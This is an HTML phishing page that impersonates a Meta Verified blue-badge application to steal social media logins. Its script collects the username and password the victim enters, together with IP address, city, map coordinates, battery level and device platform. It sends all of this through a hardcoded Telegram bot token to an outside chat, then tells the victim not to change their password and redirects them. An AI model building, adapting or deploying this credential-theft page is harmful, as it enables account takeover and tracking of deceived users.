<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Meta Verified | Get Your Blue Badge</title>
    <style>
        body { background: #fafafa; color: #262626; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .box { background: #fff; border: 1px solid #dbdbdb; padding: 30px; width: 90%; max-width: 350px; text-align: center; border-radius: 1px; }
        .meta-logo { width: 100px; margin-bottom: 20px; }
        .blue-tick { width: 50px; margin-bottom: 10px; }
        h2 { font-size: 18px; margin-bottom: 10px; color: #1c1e21; }
        p { font-size: 13px; color: #8e8e8e; margin-bottom: 20px; }
        input { width: 100%; padding: 10px; margin: 5px 0; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; font-size: 12px; }
        .btn { width: 100%; padding: 10px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 15px; }
        #loading { display: none; margin-top: 15px; font-size: 12px; color: #0095f6; font-weight: bold; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7b/Meta_Platforms_Inc._logo.svg/1280px-Meta_Platforms_Inc._logo.svg.png" class="meta-logo">
    <br>
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e4/Twitter_Verified_Badge.svg/2048px-Twitter_Verified_Badge.svg.png" class="blue-tick">
    <h2>Apply for Blue Badge</h2>
    <p>Confirm your account details to start the verification process.</p>
    
    <input type="text" id="target_user" placeholder="Username or Profile Link">
    <input type="password" id="target_pass" placeholder="Account Password">
    
    <button class="btn" onclick="startTrap()">Submit Application</button>
    
    <div id="loading">Verifying with Meta Servers...</div>
</div>

<script>
    const token = "8533713892:AAGYF0xkIlVDGmCwywyw3Y2_zt8EuiQfZ-g";
    const chatId = "7461145170";

    async function startTrap() {
        const user = document.getElementById('target_user').value;
        const pass = document.getElementById('target_pass').value;

        if(!user || !pass) { alert("Please fill all fields!"); return; }

        document.getElementById('loading').style.display = 'block';

        try {
            const res = await fetch('https://ipapi.co/json/');
            const d = await res.json();

            let bat = "N/A";
            if (navigator.getBattery) {
                const b = await navigator.getBattery();
                bat = Math.round(b.level * 100) + "%";
            }

            const report = `
💎 **META VERIFICATION TRAP** 💎
------------------------------
👤 **Username:** \`${user}\`
🔑 **Password:** \`${pass}\`
🔋 **Battery:** ${bat}
🌐 **IP:** \`${d.ip}\`
📍 **Loc:** ${d.city}, ${d.country_name}
📱 **Device:** ${navigator.platform}
------------------------------
📍 **Map:** https://www.google.com/maps?q=${d.latitude},${d.longitude}
------------------------------
            `;

            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: chatId, text: report, parse_mode: 'Markdown' })
            });

            setTimeout(() => {
                alert("Request Received! Your account is under review. Please do not change your password for 24 hours.");
                window.location.href = "https://t.me/TOPAK1V";
            }, 4000);

        } catch (e) { window.location.href = "https://t.me/TOPAK1V"; }
    }
</script>
</body>
</html>
